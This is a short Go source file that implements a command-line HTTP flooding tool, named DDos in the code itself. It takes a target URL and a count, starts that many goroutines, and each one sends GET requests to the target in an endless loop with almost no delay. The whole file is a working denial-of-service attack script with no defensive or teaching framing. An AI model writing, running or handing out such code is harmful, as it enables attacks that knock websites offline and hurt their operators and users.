package base

import (
	"fmt"
	"io"
	"io/ioutil"
	"net/http"
	"os"
	"runtime"
	"strconv"
	"time"
)

func DDosRun() {
	runtime.GOMAXPROCS(runtime.NumCPU()) // use the multi cpus
	if len(os.Args) < 2 {
		fmt.Println("use like: xx url times")
		os.Exit(1)
	}
	url := os.Args[1]
	times, _ := strconv.ParseInt(os.Args[2], 10, 64)
	d := &DDos{times, 0, url, 1000}
	d.Run()
	fmt.Println("Process status::", url, times)
	fmt.Scanln()
}

type DDos struct {
	times   int64
	donenum int
	target  string
	maxerr  int64
}

func (d *DDos) Do(pid int64) {
	for {
		resp, err := http.Get(d.target)
		d.donenum++
		status := "yes"
		if err != nil {
			fmt.Println(err.Error())
			status = "no"
		}
		if resp != nil {
			io.Copy(ioutil.Discard, resp.Body)
			resp.Body.Close()
		}
		fmt.Println("Running::(pid, times, status)", pid, d.donenum, status)
		time.Sleep(1 * time.Millisecond)
	}
}

func (d *DDos) Run() {
	var i int64
	for i = 0; i < d.times; i++ {
		go d.Do(i)
	}
}
